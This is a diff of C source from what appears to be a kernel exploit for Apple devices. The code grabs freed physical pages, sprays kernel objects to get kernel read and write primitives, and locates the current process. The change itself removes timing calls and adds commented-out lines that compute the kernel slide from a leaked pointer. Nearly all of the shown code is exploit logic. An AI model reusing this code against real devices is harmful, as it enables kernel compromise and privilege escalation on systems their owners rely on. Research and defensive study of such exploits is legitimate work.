@@ -91,13 +91,10 @@ void krkw_init(struct kfd* kfd, u64 kread_method, u64 kwrite_method)
 void krkw_run(struct kfd* kfd)
 {
     krkw_helper_grab_free_pages(kfd);
-
-    timer_start();
     krkw_helper_run_allocate(kfd, &kfd->kread);
     krkw_helper_run_allocate(kfd, &kfd->kwrite);
     krkw_helper_run_deallocate(kfd, &kfd->kread);
     krkw_helper_run_deallocate(kfd, &kfd->kwrite);
-    timer_end();
 }
 
 void krkw_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
@@ -127,8 +124,6 @@ void krkw_helper_init(struct kfd* kfd, struct krkw* krkw)
 
 void krkw_helper_grab_free_pages(struct kfd* kfd)
 {
-    timer_start();
-
     const u64 copy_pages = (kfd->info.copy.size / pages(1));
     const u64 grabbed_puaf_pages_goal = (kfd->puaf.number_of_puaf_pages / 4);
     const u64 grabbed_free_pages_max = 400000;
@@ -142,7 +137,6 @@ void krkw_helper_grab_free_pages(struct kfd* kfd)
             if (!memcmp(info_copy_sentinel, (void*)(puaf_page_uaddr), info_copy_sentinel_size)) {
                 if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
                     print_u64(grabbed_free_pages);
-                    timer_end();
                     return;
                 }
             }
@@ -154,7 +148,6 @@ void krkw_helper_grab_free_pages(struct kfd* kfd)
 
 void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw)
 {
-    timer_start();
     const u64 batch_size = (pages(1) / krkw->krkw_object_size);
 
     while (true) {
@@ -200,8 +193,6 @@ loop_break:
             break;
         }
     }
-
-    timer_end();
     const char* krkw_type = (krkw->krkw_method_ops.kread) ? "kread" : "kwrite";
 
     if (!krkw->krkw_object_uaddr) {
@@ -226,6 +217,9 @@ loop_break:
     );
 
     print_buffer(krkw->krkw_object_uaddr, krkw->krkw_object_size);
+    
+    //volatile u64* object = (volatile u64*)(krkw->krkw_object_uaddr);
+    //kfd->perf.kernel_slide = (uint64_t)(object[0]) - 0xfffffff006cba5d0;
 
     if (!kfd->info.kaddr.current_proc) {
         krkw->krkw_method_ops.find_proc(kfd);
@@ -234,8 +228,6 @@ loop_break:
 
 void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw)
 {
-    timer_start();
-
     for (u64 id = 0; id < krkw->krkw_allocated_id; id++) {
         if (id == krkw->krkw_object_id) {
             continue;
@@ -243,8 +235,6 @@ void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw)
 
         krkw->krkw_method_ops.deallocate(kfd, id);
     }
-
-    timer_end();
 }
 
 void krkw_helper_free(struct kfd* kfd, struct krkw* krkw)
